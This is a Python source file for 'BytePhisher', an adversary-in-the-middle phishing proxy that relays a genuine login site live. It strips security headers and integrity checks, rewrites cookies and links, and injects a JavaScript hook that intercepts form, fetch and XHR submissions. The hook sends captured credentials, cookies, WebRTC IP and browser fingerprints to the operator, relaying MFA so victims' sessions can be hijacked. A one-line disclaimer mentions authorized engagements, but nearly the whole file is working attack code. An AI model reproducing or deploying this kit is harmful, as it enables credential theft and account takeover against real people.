# BytePhisher — reverse-proxy engine (Layer 1).
#
# Instead of serving a static copy of a login page, this proxies the REAL site
# live and injects a capture hook, so the victim sees the genuine page (real CSS,
# real JS, real redirects, real MFA prompts) while every submission, cookie and
# fingerprint lands in the capture store.
#
# How it works
#   * a "phishlet" (YAML) describes the target: upstream host, which paths get the
#     hook, which fields are credentials, which cookies matter
#   * each victim gets a ProxySession with its own upstream cookie jar, so
#     multi-step flows (login -> MFA -> dashboard) keep working against the real
#     site
#   * responses are rewritten: absolute URLs point back at the proxy, SRI
#     integrity attributes and CSP/HSTS/X-Frame headers are dropped, Set-Cookie
#     Domain attributes are neutralised, Location headers are rewritten
#   * the injected hook intercepts fetch/XHR/form.submit, ships the fields plus a
#     device fingerprint to /__bh/capture, then lets the real submit proceed so
#     the upstream session is genuinely established (MFA relay, not bypass)
#
# Authorized engagements only: proxying a third-party site without written
# permission is illegal in most jurisdictions.
import http.cookiejar
import http.server
import json
import re
import secrets
import socketserver
import threading
import time
import urllib.parse

try:
    import yaml
except ImportError:                                     # pragma: no cover
    yaml = None

DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")

# headers that must not survive the hop (they break proxying or leak the trick)
STRIP_RESPONSE_HEADERS = {
    "content-security-policy", "content-security-policy-report-only",
    "strict-transport-security", "x-frame-options", "public-key-pins",
    "public-key-pins-report-only", "expect-ct", "report-to", "nel",
    "cross-origin-opener-policy", "cross-origin-embedder-policy",
    "content-length", "content-encoding", "transfer-encoding", "connection",
    "alt-svc", "clear-site-data",
}
STRIP_REQUEST_HEADERS = {
    "host", "content-length", "accept-encoding", "connection", "expect",
    "upgrade-insecure-requests", "sec-fetch-site", "sec-fetch-mode",
    "sec-fetch-dest", "sec-fetch-user",
}

from . import classify
from . import intel as intel_mod
from .intel import INTEL_JS_PATH, INTEL_PATH

HOOK_PATH = "/__bh/hook.js"
CAPTURE_PATH = "/__bh/capture"
BEACON_PATH = "/__bh/beacon"

# Hard limits so a hostile or broken client cannot exhaust memory. A real
# browser submission is a few KB; 2 MB is generous for a login form plus the
# fingerprint/telemetry payload.
MAX_BODY = 2 * 1024 * 1024
# The session map holds one small object per victim. Cap it and evict the
# least-recently-seen entries, otherwise a long campaign grows forever.
MAX_SESSIONS = 5000
# short alias so a page can also post to /intel
INTEL_ALIAS_FALLBACK = "/intel"


# ------------------------------------------------------------------ phishlet --
class Phishlet:
    """Target definition. Load from YAML or build in code (tests do the latter)."""

    def __init__(self, name="phishlet", upstream="", scheme="https",
                 login_path="/", capture_fields=("username", "password"),
                 username_field="username", password_field="password",
                 capture_cookies=("*",), inject_paths=(".*",), block_paths=(),
                 redirect_after="", strip_integrity=True, rewrite_hosts=None,
                 verify_tls=True, timeout=20, intel_perms=False):
        self.name = name
        self.upstream = upstream.rstrip("/")
        self.scheme = scheme
        self.login_path = login_path
        self.capture_fields = list(capture_fields)
        self.username_field = username_field
        self.password_field = password_field
        self.capture_cookies = list(capture_cookies)
        self.inject_paths = list(inject_paths)
        self.block_paths = list(block_paths)
        self.redirect_after = redirect_after
        self.strip_integrity = strip_integrity
        self.rewrite_hosts = list(rewrite_hosts or ([upstream] if upstream else []))
        self.verify_tls = verify_tls
        self.timeout = timeout
        # permission-gated probes (geolocation/clipboard/notifications) only
        # fire when the operator opts in — they cost a browser prompt
        self.intel_perms = intel_perms

    @classmethod
    def from_yaml(cls, path):
        if yaml is None:
            raise RuntimeError("PyYAML required to load phishlets")
        with open(path, encoding="utf-8") as f:
            data = yaml.safe_load(f) or {}
        return cls(**{k: v for k, v in data.items() if k in cls.__init__.__code__.co_varnames})

    def wants_injection(self, path):
        if any(re.search(p, path) for p in self.block_paths):
            return False
        return any(re.search(p, path) for p in self.inject_paths)

    def wants_cookie(self, name):
        return "*" in self.capture_cookies or name in self.capture_cookies

    @property
    def base_url(self):
        return f"{self.scheme}://{self.upstream}"


# ------------------------------------------------------------------- session --
class ProxySession:
    """One victim: its own upstream cookie jar + everything we learned."""

    def __init__(self, sid, ip="", ua=DEFAULT_UA, campaign=""):
        self.sid = sid
        self.ip = ip
        self.ua = ua or DEFAULT_UA
        self.campaign = campaign
        self.created = time.time()
        self.cookies = http.cookiejar.CookieJar()      # upstream session state
        self.harvested = []                            # cookies we care about
        self.captures = 0
        self.fingerprint = {}
        self.recording = []                            # rrweb-style events
        self.last_seen = time.time()

    def cookie_header(self):
        return "; ".join(f"{c.name}={c.value}" for c in self.cookies)

    def note_cookies(self, phishlet, set_cookie_headers):
        """Parse upstream Set-Cookie values into the jar and record the juicy ones."""
        for raw in set_cookie_headers:
            parts = [p.strip() for p in raw.split(";")]
            if not parts or "=" not in parts[0]:
                continue
            name, _, value = parts[0].partition("=")
            attrs = {}
            for p in parts[1:]:
                k, _, v = p.partition("=")
                attrs[k.strip().lower()] = v.strip()
            cookie = http.cookiejar.Cookie(
                version=0, name=name, value=value,
                port=None, port_specified=False,
                domain="", domain_specified=False, domain_initial_dot=False,
                path="/", path_specified=True,
                secure=False, expires=None, discard=True,
                comment=None, comment_url=None, rest={}, rfc2109=False)
            self.cookies.set_cookie(cookie)
            if phishlet.wants_cookie(name):
                self.harvested.append({"name": name, "value": value, "ts": time.time()})

    def to_dict(self):
        return {"sid": self.sid, "ip": self.ip, "ua": self.ua, "campaign": self.campaign,
                "created": self.created, "captures": self.captures,
                "harvested_cookies": self.harvested, "fingerprint": self.fingerprint,
                "events": len(self.recording)}


# -------------------------------------------------------------------- engine --
class ProxyEngine:
    """Fetch upstream, rewrite, inject, capture."""

    def __init__(self, phishlet, db=None, on_capture=None, geo_provider="off",
                 public_host="", logger=print, rewrite_absolute=True):
        self.phishlet = phishlet
        self.db = db
        self.on_capture = on_capture
        self.geo_provider = geo_provider
        self.public_host = public_host          # what victims see (proxy domain)
        self.log = logger
        self.sessions = {}
        self.rewrite_absolute = rewrite_absolute
        self._lock = threading.Lock()

    def geo(self, ip):
        """Geo/ISP for an IP, using the same providers as the static server."""
        if self.geo_provider == "off" or not ip:
            return {}
        urls = {"ipapi": "https://ipapi.co/{ip}/json/",
                "ipinfo": "https://ipinfo.io/{ip}/json"}
        tmpl = urls.get(self.geo_provider)
        if not tmpl:
            return {}
        try:
            from . import net
            g = net.fetch_json(tmpl.format(ip=ip), timeout=5)
            return {"ip": ip, "city": g.get("city") or "",
                    "country": (g.get("country_name") or g.get("country") or ""),
                    "isp": (g.get("org") or g.get("asn") or g.get("isp") or "")}
        except Exception:
            return {}

    # ---- sessions ----
    def session(self, sid=None, ip="", ua="", campaign=""):
        with self._lock:
            if sid and sid in self.sessions:
                s = self.sessions[sid]
                s.last_seen = time.time()
                return s
            # secrets, not uuid4: a session id must not be predictable, and
            # 128 bits makes guessing useless (uuid4 hex[:16] was 64 bits)
            sid = sid or secrets.token_hex(16)
            s = ProxySession(sid, ip=ip, ua=ua, campaign=campaign)
            self.sessions[sid] = s
            if len(self.sessions) > MAX_SESSIONS:
                # evict the least-recently-seen quarter in one pass
                drop = sorted(self.sessions.values(), key=lambda x: x.last_seen)
                for old in drop[: max(1, MAX_SESSIONS // 4)]:
                    self.sessions.pop(old.sid, None)
            return s

    # ---- upstream ----
    def fetch(self, sess, method, path, headers=None, body=None):
        """Request the real site with this victim's cookie jar.

        An absolute URL is only accepted when it points at OUR upstream. A
        victim-supplied absolute-form request line (GET http://internal/…) used
        to be fetched verbatim, which turned the proxy into an open forward
        proxy: internal services, loopback and cloud metadata were reachable,
        and the victim's session cookies were sent to the chosen host.
        """
        import requests
        if path.startswith("http"):
            if not path.startswith(self.phishlet.base_url):
                raise ValueError("refusing to fetch a foreign absolute URL")
            url = path
        else:
            url = f"{self.phishlet.base_url}{path}"
        h = {k: v for k, v in (headers or {}).items()
             if k.lower() not in STRIP_REQUEST_HEADERS}
        h.setdefault("User-Agent", sess.ua)
        h.setdefault("Accept-Language", "en-US,en;q=0.9")
        jar = sess.cookies
        resp = requests.request(method, url, headers=h, data=body,
                                cookies={c.name: c.value for c in jar},
                                allow_redirects=False, verify=self.phishlet.verify_tls,
                                timeout=self.phishlet.timeout)
        sess.note_cookies(self.phishlet, resp.raw.headers.getlist("Set-Cookie")
                          if hasattr(resp.raw.headers, "getlist") else
                          ([resp.headers["Set-Cookie"]] if "Set-Cookie" in resp.headers else []))
        return resp

    # ---- rewriting ----
    def rewrite_headers(self, resp, over_tls=False):
        """Return a LIST of (name, value) pairs.

        Duplicates matter: an upstream page can set several cookies and we must
        add our own session cookie on top, so a dict would silently drop them.
        """
        out = []
        for k, v in resp.raw.headers.items() if hasattr(resp.raw.headers, "items") \
                else resp.headers.items():
            kl = k.lower()
            if kl in STRIP_RESPONSE_HEADERS:
                continue
            if kl == "set-cookie":
                # keep the cookie usable on our host: Domain always goes, and
                # Secure only when we are serving plain HTTP (keeping it over
                # HTTPS preserves the upstream's transport guarantee)
                v = re.sub(r";\s*Domain=[^;]+", "", v, flags=re.I)
                if not over_tls:
                    v = re.sub(r";\s*Secure", "", v, flags=re.I)
                out.append((k, v))
                continue
            if kl == "location":
                out.append((k, self.rewrite_url(v)))
                continue
            out.append((k, v))
        return out

    def rewrite_url(self, url):
        """Point an upstream absolute URL back at the proxy."""
        if not url or not self.rewrite_absolute:
            return url
        for host in self.phishlet.rewrite_hosts:
            if not host:
                continue
            url = re.sub(rf"https?://{re.escape(host)}", "", url, count=1)
        if url.startswith("//"):
            url = "/" + url[2:]
        return url or "/"

    def rewrite_html(self, html, sess, path="/"):
        # 1) absolute links/actions back to the proxy
        for host in self.phishlet.rewrite_hosts:
            if not host:
                continue
            html = re.sub(rf'((?:href|src|action)=["\'])(?:https?:)?//{re.escape(host)}',
                          r"\1", html, flags=re.I)
        # 2) SRI breaks once we inject/rewrite, so drop integrity attributes
        if self.phishlet.strip_integrity:
            html = re.sub(r'\s+integrity=["\'][^"\']*["\']', "", html, flags=re.I)
            html = re.sub(r'\s+crossorigin=["\'][^"\']*["\']', "", html, flags=re.I)
        # 3) inject the hook + the deep-intel collector
        if self.phishlet.wants_injection(path):
            tag = (f'<script src="{HOOK_PATH}?s={sess.sid}" '
                   f'data-capture="{CAPTURE_PATH}" data-beacon="{BEACON_PATH}"></script>')
            tag += (f'<script src="{INTEL_JS_PATH}?s={sess.sid}&p={1 if self.phishlet.intel_perms else 0}" '
                    f'data-intel="{INTEL_PATH}" defer></script>')
            if re.search(r"</head>", html, re.I):
                html = re.sub(r"</head>", tag + "</head>", html, count=1, flags=re.I)
            elif re.search(r"</body>", html, re.I):
                html = re.sub(r"</body>", tag + "</body>", html, count=1, flags=re.I)
            else:
                html = tag + html
        return html

    # ---- deep device intelligence ----
    def intel(self, payload, ip=""):
        """Merge one collector wave and (re)write the session's intel record."""
        sid = str(payload.get("sid") or "").strip() or secrets.token_hex(8)
        merged = intel_mod.merge_waves(self.db.intel_for_session(sid) if self.db else {},
                                       payload)
        geo = self.geo(ip) if self.geo_provider != "off" else {}
        summary = intel_mod.summarize(merged, ua=payload.get("ua") or "",
                                      server_ip=ip,
                                      geo_country=(geo or {}).get("country", ""))
        summary["sid"] = sid
        risk = intel_mod.risk_from_intel(summary)
        if self.db:
            raw = {"mods": merged, "last": payload}
            if self.db.intel_for_session(sid):
                self.db.intel_update(sid, summary, raw, risk=risk)
            else:
                self.db.log_intel(sid, ip, (geo or {}).get("city", ""),
                                  (geo or {}).get("country", ""), (geo or {}).get("isp", ""),
                                  summary.get("user_agent") or payload.get("ua") or "",
                                  summary, raw, risk=risk)
        # a real device that arrives with no form submit still pings the operator
        if self.on_capture and payload.get("wave") in ("open", "gesture", "final"):
            try:
                self.on_capture({
                    "type": "intel", "sid": sid, "ip": ip,
                    "browser": summary.get("browser"), "os": summary.get("os"),
                    "device_class": summary.get("device_class"),
                    "device_token": (summary.get("fingerprint") or {}).get("device_token"),
                    "headless": (summary.get("automation") or {}).get("headless_score"),
                    "vpn": (summary.get("network_risk") or {}).get("vpn_suspected_score"),
                    "wave": payload.get("wave"),
                })
            except Exception:
                pass
        return {"ok": True, "sid": sid, "wave": payload.get("wave"),
                "modules": len(summary.get("modules_collected") or []),
                "headless": (summary.get("automation") or {}).get("headless_score"),
                "device_token": (summary.get("fingerprint") or {}).get("device_token")}

    # ---- capture ----
    def capture(self, sess, payload, ip=""):
        """Store one hook submission (fields + cookies + fingerprint)."""
        fields = payload.get("fields") or {}
        cookies = payload.get("cookies") or {}
        fp = payload.get("fingerprint") or {}
        events = payload.get("events") or []
        sess.captures += 1
        sess.fingerprint.update(fp)
        if events:
            # total cap, not just a per-call slice: a client posting 500 events
            # in a loop used to grow one session's recording without limit
            sess.recording.extend(events[:500])
            if len(sess.recording) > 5000:
                del sess.recording[:-5000]
        for name, value in (cookies or {}).items():
            if self.phishlet.wants_cookie(name):
                sess.harvested.append({"name": name, "value": value,
                                       "ts": time.time(), "source": "js"})
        is_cred = self._looks_like_credentials(fields)
        risk, reasons = self._risk(fields, fp)
        if self.db is not None:
            self.db.record("/__bh/capture", ip or sess.ip, "", "", "", sess.ua,
                           self._device(sess.ua), {**fields, "_fp": json.dumps(fp)[:400],
                                                   "_cookies": json.dumps(cookies)[:400]},
                           is_cred, campaign=sess.campaign, risk=risk,
                           risk_reasons=reasons)
        if self.on_capture:
            try:
                self.on_capture({"template": self.phishlet.name, "campaign": sess.campaign,
                                 "ip": ip or sess.ip, "device": self._device(sess.ua),
                                 "fields": fields, "is_cred": is_cred, "risk": risk,
                                 "risk_reasons": reasons, "cookies": cookies,
                                 "fingerprint": fp, "session": sess.sid,
                                 "proxy_mode": True})
            except Exception:
                pass
        return {"ok": True, "cred": is_cred, "session": sess.sid}

    def _looks_like_credentials(self, fields):
        # shared with the static server (core/classify.py)
        return classify.is_credential_pair(fields)

    def _risk(self, fields, fp):
        s, reasons = 0, []
        if fp.get("webdriver"):
            s += 50
            reasons.append("navigator.webdriver set (automation)")
        if fp.get("headless_hints"):
            s += 40
            reasons.append(f"headless hints: {', '.join(fp['headless_hints'][:3])}")
        if not fp.get("canvas_hash"):
            s += 15
            reasons.append("no canvas fingerprint (JS blocked or bot)")
        if fp.get("webgl_renderer") and "swiftshader" in str(fp["webgl_renderer"]).lower():
            s += 35
            # keep the raw renderer string: it is the evidence in the report
            reasons.append(f"software WebGL renderer (headless): {fp['webgl_renderer']}")
        if fp.get("tz_mismatch"):
            s += 25
            reasons.append(f"timezone/IP mismatch: {fp.get('timezone')} vs {fp.get('ip_country')}")
        hp = fields.get("hp_email")
        if hp:
            s += 40
            reasons.append("honeypot field filled")
        return min(100, s), reasons

    @staticmethod
    def _device(ua):
        ua = (ua or "").lower()
        for needle, name in (("iphone", "ios"), ("ipad", "ios"), ("android", "android"),
                             ("mac os", "macos"), ("windows", "windows"), ("linux", "linux")):
            if needle in ua:
                return name
        return "unknown"

    # ---- hook ----
    def hook_js(self, sid):
        return HOOK_JS.replace("__SID__", sid).replace("__CAPTURE__", CAPTURE_PATH) \
                       .replace("__BEACON__", BEACON_PATH)


HOOK_JS = r"""
/* BytePhisher capture hook — runs inside the real page, transparent to the user.
   Sends what the victim typed plus a device fingerprint, then lets the genuine
   submit continue so the upstream session is really established. */
(function () {
  var SID = "__SID__", CAP = "__CAPTURE__", BEACON = "__BEACON__";
  function fingerprint() {
    var fp = {ua: navigator.userAgent, webdriver: !!navigator.webdriver,
              lang: navigator.language, tz: null, screen: null,
              plugins: (navigator.plugins || []).length,
              hw: navigator.hardwareConcurrency || 0,
              headless_hints: []};
    try { fp.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}
    fp.screen = [screen.width, screen.height, screen.colorDepth].join("x");
    if (!window.chrome) fp.headless_hints.push("no window.chrome");
    if (!navigator.languages || !navigator.languages.length) fp.headless_hints.push("no languages");
    if (navigator.webdriver) fp.headless_hints.push("webdriver");
    try {
      var c = document.createElement("canvas"), ctx = c.getContext("2d");
      ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillText("bh", 2, 2);
      fp.canvas_hash = c.toDataURL().slice(-64);
      var gl = document.createElement("canvas").getContext("webgl");
      if (gl) {
        var dbg = gl.getExtension("WEBGL_debug_renderer_info");
        fp.webgl_renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "masked";
      }
    } catch (e) {}
    try {
      var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({iceServers: []});
      pc.createDataChannel("x");
      pc.onicecandidate = function (e) {
        if (e.candidate && e.candidate.candidate) {
          var m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
          if (m) { fp.webrtc_ip = m[1]; send({fingerprint: fp}); }
        }
      };
      pc.createOffer().then(function (o) { pc.setLocalDescription(o); });
    } catch (e) {}
    return fp;
  }
  var FP = fingerprint();
  function cookieMap() {
    var out = {};
    document.cookie.split(";").forEach(function (p) {
      var i = p.indexOf("="); if (i > 0) out[p.slice(0, i).trim()] = p.slice(i + 1).trim();
    });
    return out;
  }
  var events = [];
  function send(payload) {
    payload.sid = SID;
    payload.cookies = cookieMap();
    if (!payload.fingerprint) payload.fingerprint = FP;
    if (events.length) payload.events = events.slice(-200);
    var body = JSON.stringify(payload);
    try { navigator.sendBeacon(CAP, new Blob([body], {type: "application/json"})); }
    catch (e) { try { fetch(CAP, {method: "POST", body: body, keepalive: true,
                                  headers: {"Content-Type": "application/json"}}); } catch (e2) {} }
  }
  function fields(form) {
    var out = {};
    new FormData(form).forEach(function (v, k) { if (typeof v === "string") out[k] = v; });
    return out;
  }
  /* typing telemetry: timing + which field, never keystroke content */
  ["input", "keydown"].forEach(function (evt) {
    document.addEventListener(evt, function (e) {
      if (e.target && (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA")) {
        events.push({t: Date.now(), type: evt, name: e.target.name || e.target.id || "",
                     len: (e.target.value || "").length});
      }
    }, true);
  });
  document.addEventListener("mousemove", function (e) {
    if (events.length < 200) events.push({t: Date.now(), type: "mm", x: e.clientX, y: e.clientY});
  }, true);
  document.addEventListener("submit", function (e) {
    try { send({fields: fields(e.target), url: location.href, kind: "submit"}); } catch (err) {}
  }, true);
  var origFetch = window.fetch;
  if (origFetch) {
    window.fetch = function (input, init) {
      try {
        var u = (typeof input === "string") ? input : (input && input.url);
        if (init && init.body && typeof init.body === "string" && /login|auth|token|signin/i.test(u || "")) {
          var parsed = {};
          try { JSON.parse(init.body); parsed = JSON.parse(init.body); } catch (e) {
            init.body.split("&").forEach(function (kv) {
              var i = kv.indexOf("="); if (i > 0) parsed[decodeURIComponent(kv.slice(0, i))] =
                decodeURIComponent(kv.slice(i + 1));
            });
          }
          send({fields: parsed, url: u, kind: "fetch"});
        }
      } catch (e) {}
      return origFetch.apply(this, arguments);
    };
  }
  var OrigXHR = window.XMLHttpRequest;
  if (OrigXHR && OrigXHR.prototype && OrigXHR.prototype.send) {
    var origSend = OrigXHR.prototype.send;
    OrigXHR.prototype.send = function (body) {
      try {
        if (body && typeof body === "string") {
          var parsed = {};
          body.split("&").forEach(function (kv) {
            var i = kv.indexOf("="); if (i > 0) parsed[decodeURIComponent(kv.slice(0, i))] =
              decodeURIComponent(kv.slice(i + 1));
          });
          if (Object.keys(parsed).length) send({fields: parsed, url: this.__bh_url || "", kind: "xhr"});
        }
      } catch (e) {}
      return origSend.apply(this, arguments);
    };
    var origOpen = OrigXHR.prototype.open;
    OrigXHR.prototype.open = function (m, u) { this.__bh_url = u; return origOpen.apply(this, arguments); };
  }
  window.addEventListener("load", function () { send({fields: {}, kind: "load"}); });
})();
"""


# ------------------------------------------------------------------- server ---
class ProxyHandler(http.server.BaseHTTPRequestHandler):
    # keep-alive for the proxied assets and the collector waves
    protocol_version = "HTTP/1.1"
    engine = None            # set by serve_proxy()
    server_version = "nginx"
    sys_version = ""

    def log_message(self, *a):
        pass

    # -- helpers --
    def _session_cookie(self, sid):
        """HttpOnly always (page script must not read the session id), Secure
        whenever the victim's connection is HTTPS (direct TLS or tunnel edge)."""
        c = f"__bhs={sid}; Path=/; SameSite=Lax; HttpOnly"
        if self._over_tls():
            c += "; Secure"
        return c

    def _json(self, obj, status=200):
        body = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _client_ip(self):
        for h in ("CF-Connecting-IP", "True-Client-IP", "X-Real-IP"):
            if self.headers.get(h):
                return self.headers[h].strip()
        xff = self.headers.get("X-Forwarded-For")
        if xff:
            return xff.split(",")[0].strip()
        return self.client_address[0]

    def _session(self, sid_hint=None):
        """Reuse the victim's session id from the payload, cookie or query,
        else start a new one. Without the payload hint, captures arriving
        without our cookie would silently create a brand-new session."""
        sid = sid_hint
        if not sid:
            cookie = self.headers.get("Cookie") or ""
            m = re.search(r"__bhs=([0-9a-f]{16,64})", cookie)
            if m:
                sid = m.group(1)
        if not sid:
            q = urllib.parse.urlparse(self.path).query
            cand = urllib.parse.parse_qs(q).get("s", [""])[0]
            # 16+ hex chars (64+ bits) — a 6-char sid allowed session fixation
            m2 = re.match(r"^([0-9a-f]{16,64})$", cand or "")
            if m2:
                sid = m2.group(1)
        return self.engine.session(sid, ip=self._client_ip(),
                                   ua=self.headers.get("User-Agent", ""),
                                   campaign=getattr(self.engine, "campaign", ""))

    # -- routes --
    def do_GET(self):
        path = self.path
        if path.startswith(INTEL_JS_PATH):
            sess = self._session()
            q = urllib.parse.parse_qs(urllib.parse.urlparse(path).query)
            sid = (q.get("s", [sess.sid])[0] or sess.sid)
            perms = q.get("p", ["0"])[0] in ("1", "true")
            import os as _os
            js_path = _os.path.join(_os.path.dirname(_os.path.dirname(
                _os.path.abspath(__file__))), "assets", "intel.js")
            try:
                js = intel_mod.render_js(js_path, sid, perms=perms).encode()
            except Exception as e:
                js = ("/* intel collector unavailable: %s */" % e).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Content-Length", str(len(js)))
            self.send_header("Set-Cookie", self._session_cookie(sess.sid))
            self.end_headers()
            self.wfile.write(js)
            return
        if path.startswith(HOOK_PATH):
            sess = self._session()
            js = self.engine.hook_js(sess.sid).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Content-Length", str(len(js)))
            self.send_header("Set-Cookie", self._session_cookie(sess.sid))
            self.end_headers()
            self.wfile.write(js)
            return
        self._proxy("GET")

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        if path in (INTEL_PATH, INTEL_ALIAS_FALLBACK):
            n = int(self.headers.get("Content-Length") or 0)
            if n > MAX_BODY:
                self._json({"ok": False, "error": "payload too large"}, status=413)
                return
            raw = self.rfile.read(n) if n else b""
            try:
                payload = json.loads(raw.decode("utf-8", "replace") or "{}")
                if not isinstance(payload, dict):
                    raise ValueError("payload must be an object")
            except Exception:
                self._json({"ok": False, "error": "malformed json"}, status=400)
                return
            if not payload.get("mods") and not payload.get("errors"):
                self._json({"ok": False, "error": "empty payload"}, status=400)
                return
            payload.setdefault("ua", self.headers.get("User-Agent", ""))
            self._json(self.engine.intel(payload, ip=self._client_ip()))
            return
        if path in (CAPTURE_PATH, BEACON_PATH):
            n = int(self.headers.get("Content-Length") or 0)
            raw = self.rfile.read(n) if n else b""
            try:
                payload = json.loads(raw.decode("utf-8", "replace") or "{}")
                if not isinstance(payload, dict):
                    raise ValueError("payload must be an object")
            except Exception:
                # malformed body: reject it and store nothing (a junk row would
                # pollute the campaign numbers)
                self._json({"ok": False, "error": "malformed json"}, status=400)
                return
            if not any(payload.get(k) for k in ("fields", "fingerprint", "cookies", "events")):
                self._json({"ok": False, "error": "empty payload"}, status=400)
                return
            hint = str(payload.get("sid") or "")
            # only a well-formed id may be adopted; anything else is replaced by
            # a fresh server-generated one (no fixation, no arbitrary keys)
            if not re.match(r"^[0-9a-f]{16,64}$", hint):
                hint = ""
            sess = self._session(sid_hint=hint or None)
            res = self.engine.capture(sess, payload, ip=self._client_ip())
            self._json(res)
            return
        self._proxy("POST")

    def do_HEAD(self):
        self._proxy("HEAD")

    # -- proxy core --
    def _target_path(self):
        """Path + query only. An absolute-form request line keeps its path and
        loses the attacker's host, so the proxy can never be used as a forward
        proxy to a third party or an internal address."""
        p = self.path or "/"
        if p[:7].lower() == "http://" or p[:8].lower() == "https://":
            u = urllib.parse.urlsplit(p)
            p = u.path or "/"
            if u.query:
                p += "?" + u.query
        if not p.startswith("/"):
            p = "/" + p
        return p

    def _over_tls(self):
        """Did the victim reach us over HTTPS (direct TLS or a tunnel edge)?"""
        if getattr(self.connection, "cipher", None):
            return True
        proto = (self.headers.get("X-Forwarded-Proto") or "").split(",")[0].strip()
        return proto.lower() == "https"

    def _proxy(self, method):
        sess = self._session()
        n = int(self.headers.get("Content-Length") or 0)
        if n < 0:
            n = 0
        if n > MAX_BODY:
            self._json({"ok": False, "error": "payload too large"}, status=413)
            return
        body = self.rfile.read(n) if n else None
        hdrs = {k: v for k, v in self.headers.items()}
        hdrs["Cookie"] = sess.cookie_header()          # upstream session, not the victim's
        try:
            resp = self.engine.fetch(sess, method, self._target_path(), headers=hdrs, body=body)
        except Exception as e:
            # look like a real site hiccup, never like a proxy error
            msg = (b"<!doctype html><html><head><title>502</title></head><body>"
                   b"<h1>Bad gateway</h1><p>The server is temporarily unavailable.</p>"
                   b"</body></html>")
            self.send_response(502)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(msg)))
            self.end_headers()
            self.wfile.write(msg)
            self.engine.log(f"[proxy] upstream error: {type(e).__name__}: {e}")
            return

        ctype = resp.headers.get("Content-Type", "")
        out_headers = self.engine.rewrite_headers(resp, over_tls=self._over_tls())
        if "text/html" in ctype:
            html = resp.text
            html = self.engine.rewrite_html(html, sess, urllib.parse.urlparse(self.path).path)
            body_out = html.encode("utf-8", "replace")
            out_headers = [(k, v) for k, v in out_headers if k.lower() != "content-type"]
            out_headers.append(("Content-Type", "text/html; charset=utf-8"))
        else:
            body_out = resp.content
        out_headers = [(k, v) for k, v in out_headers if k.lower() != "content-length"]
        out_headers.append(("Content-Length", str(len(body_out))))
        # our own session cookie rides alongside whatever upstream set
        out_headers.append(("Set-Cookie", self._session_cookie(sess.sid)))

        self.send_response(resp.status_code)
        for k, v in out_headers:
            self.send_header(k, v)
        self.end_headers()
        if method != "HEAD":
            self.wfile.write(body_out)


def serve_proxy(engine, port, host="0.0.0.0", campaign=""):
    """Start the proxy; returns the httpd (call serve_forever in a thread)."""
    engine.campaign = campaign

    class Handler(ProxyHandler):
        pass

    Handler.engine = engine

    class _Server(socketserver.ThreadingMixIn, http.server.HTTPServer):
        daemon_threads = True
        request_queue_size = 128
        allow_reuse_address = True

    httpd = _Server((host, port), Handler)
    httpd.proxy_engine = engine
    return httpd
